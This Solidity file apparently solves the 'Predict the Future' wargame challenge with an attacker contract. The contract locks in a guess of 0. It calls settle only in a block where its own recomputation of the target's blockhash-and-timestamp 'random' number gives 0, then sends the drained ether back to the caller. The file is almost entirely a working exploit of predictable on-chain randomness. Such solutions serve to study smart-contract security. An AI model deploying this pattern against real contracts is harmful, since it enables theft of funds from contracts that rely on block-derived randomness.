//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IPredictTheFutureChallenge {

    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureChallengeAttacker {
    IPredictTheFutureChallenge cte;
    
    constructor(address _cteAddress) {
        cte = IPredictTheFutureChallenge(_cteAddress);
    }

    function lockInAttack() public payable {
        require(msg.value >= 1 ether, "send at least 1 ether");

        // call the cte guess function
        cte.lockInGuess{value: 1 ether}(0);
    }

    function settleAttack() public {
        // calculate the answer
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)))) % 10;
        if( answer == 0 ) {
            // call the cte guess function
            cte.settle();

            bool isCompleted = cte.isComplete();

            // if everything has gone well we should be able to send back to the oginal caller all the balance (2 eth)
            if( isCompleted ) {
                (bool sent, ) = msg.sender.call{value: address(this).balance}("");
                require(sent, "Failed to send Ether");
            }
        }
    }

    function withdraw() external {
         (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        // receive back the 2 ETH from the GuessTheNewNumberChallenge
    }
}